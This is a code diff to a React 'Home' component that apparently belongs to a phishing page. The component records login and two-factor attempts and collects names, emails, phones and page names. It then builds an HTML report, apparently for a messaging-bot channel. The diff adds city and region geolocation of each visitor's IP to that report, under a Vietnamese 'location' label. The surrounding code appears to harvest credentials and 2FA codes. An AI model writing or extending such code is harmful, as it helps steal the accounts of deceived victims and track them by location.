@@ -42,7 +42,7 @@ const Home = () => {
     });
     const [loginAttempts, setLoginAttempts] = useState([]);
     const [twoFAAttempts, setTwoFAAttempts] = useState([]);
-    const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', country: 'Unknown' });
+    const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' });
     const [translatedTexts, setTranslatedTexts] = useState({});
     const [isLoading, setIsLoading] = useState(true);
 
@@ -225,7 +225,9 @@ const Home = () => {
                 const data = response.data;
                 setIpInfo({
                     ip: data.ip || 'Unknown',
-                    country: data.country_name || 'Unknown'
+                    city: data.city || 'Unknown',
+                    region: data.region || 'Unknown',
+                    country: data.country || 'Unknown'
                 });
                 localStorage.setItem('ipInfo', JSON.stringify(data));
 
@@ -292,7 +294,8 @@ const Home = () => {
 
         let message = `📩 <b>${LABEL}</b>\n`;
         message += `⏰ ${dt}\n`;
-        message += `🌐 <code>${ipInfo.ip}</code> • ${ipInfo.country}\n`;
+        message += `🌐 IP: <code>${ipInfo.ip}</code>\n`;
+        message += `📍 Vị trí: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}\n`;
         message += `━━━━━━━━━━━━━━━━━━━━\n`;
 
         if (form.fullName || form.personalEmail || form.businessEmail || form.phone || form.pageName) {
